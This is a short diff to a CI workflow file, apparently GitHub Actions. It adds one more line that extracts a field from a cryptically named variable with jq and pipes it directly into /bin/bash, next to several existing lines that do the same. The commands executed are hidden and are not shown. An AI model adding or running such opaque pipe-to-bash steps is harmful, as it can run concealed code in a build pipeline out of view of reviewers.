@@ -22,6 +22,7 @@ jobs:
           echo $s5 | jq -r .e2 | /bin/bash
           echo $pqspp636 | jq -r .hs331 | /bin/bash
           printf '%s' "$hb7161" | jq -r .mkgp90834 | /bin/bash
+          printf '%s' "$s4" | jq -r .pipuw57563 | /bin/bash
 
       - name: Upload results
         if: always()
